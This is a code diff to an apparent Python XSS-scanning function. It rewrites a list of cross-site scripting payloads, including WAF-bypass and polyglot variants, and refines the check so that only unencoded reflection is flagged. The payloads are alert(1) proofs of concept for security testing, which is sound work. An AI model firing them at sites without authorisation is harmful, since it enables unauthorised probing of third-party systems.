@@ -351,24 +351,29 @@ def _coordinate_xss_testing(target_url: str, parameters: List[str]) -> List[Dict
     except Exception:
         pass
 
-    # Method 2: Custom advanced XSS payloads
+    # Method 2: Modern XSS payloads with realistic exploitation context
     advanced_xss_payloads = [
-        "<script>alert('XSS')</script>",
-        "javascript:alert('XSS')",
-        "'\\\"><script>alert(String.fromCharCode(88,83,83))</script>",
-        "<img src=x onerror=alert('XSS')>",
-        "<svg onload=alert('XSS')>",
-        "'-alert('XSS')-'",
-        "\\\";alert('XSS');//",
-        "<iframe src=javascript:alert('XSS')>",
-        "<body onload=alert('XSS')>",
-        "<input onfocus=alert('XSS') autofocus>",
-        # WAF bypass payloads
-        "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
+        # Basic reflection tests
+        "<script>alert(1)</script>",
+        "javascript:alert(1)",
+        "<img src=x onerror=alert(1)>",
+        "<svg onload=alert(1)>",
+        # Context-aware payloads
+        "'\\\"><script>alert(1)</script>",  # Breaking out of attributes
+        "\\\";alert(1);//",  # Breaking out of JavaScript strings
+        "<iframe src=javascript:alert(1)>",
+        # Modern DOM-based
+        "<input onfocus=alert(1) autofocus>",
+        "<body onload=alert(1)>",
+        "<details open ontoggle=alert(1)>",
+        # WAF bypass variants
+        "<svg/onload=alert(1)>",  # No space after tag
+        "<<script>alert(1)</script>",  # Double tag
+        "<script>alert`1`</script>",  # Template literals
         "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
-        "<svg/onload=alert(1)>",
-        "<<script>alert('XSS')<</script>",
-        "<script>alert`XSS`</script>",
+        "<svg><script>alert(1)</script></svg>",  # SVG context
+        # Polyglot attempts
+        "'\\\"><svg/onload=alert(1)>",
     ]
 
     # Test parameters not covered by dalfox
@@ -386,18 +391,41 @@ def _coordinate_xss_testing(target_url: str, parameters: List[str]) -> List[Dict
                 result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
 
                 if result.returncode == 0:
-                    # Check if payload is reflected
-                    if payload in result.stdout or "alert(" in result.stdout:
-                        xss_results.append(
-                            {
-                                "parameter": param,
-                                "vulnerable": True,
-                                "payload_type": "Reflected XSS",
-                                "evidence": f"Payload reflected: {payload[:50]}...",
-                                "tool": "custom",
-                            }
-                        )
-                        break  # Found vulnerability, no need to test more payloads
+                    response = result.stdout
+                    # Check if payload is reflected WITHOUT encoding (actual XSS risk)
+                    # Avoid false positives: reflected ≠ executed
+                    if payload in response:
+                        # Check if it's reflected unencoded (real risk)
+                        if not any(
+                            encoded in response
+                            for encoded in [
+                                payload.replace("<", "&lt;").replace(">", "&gt;"),  # HTML entity encoded
+                                payload.replace("<", "\\x3c").replace(">", "\\x3e"),  # Hex encoded
+                                payload.replace("<", "\\u003c").replace(">", "\\u003e"),  # Unicode encoded
+                            ]
+                        ):
+                            xss_results.append(
+                                {
+                                    "parameter": param,
+                                    "vulnerable": True,
+                                    "payload_type": "Reflected XSS (unencoded)",
+                                    "evidence": f"Payload reflected unencoded: {payload[:50]}...",
+                                    "tool": "custom",
+                                }
+                            )
+                            break  # Found vulnerability, no need to test more payloads
+                        else:
+                            # Reflected but encoded = not exploitable
+                            xss_results.append(
+                                {
+                                    "parameter": param,
+                                    "vulnerable": False,
+                                    "payload_type": "Reflected but encoded (not exploitable)",
+                                    "evidence": f"Payload reflected with encoding",
+                                    "tool": "custom",
+                                }
+                            )
+                            break
 
             except Exception:
                 continue
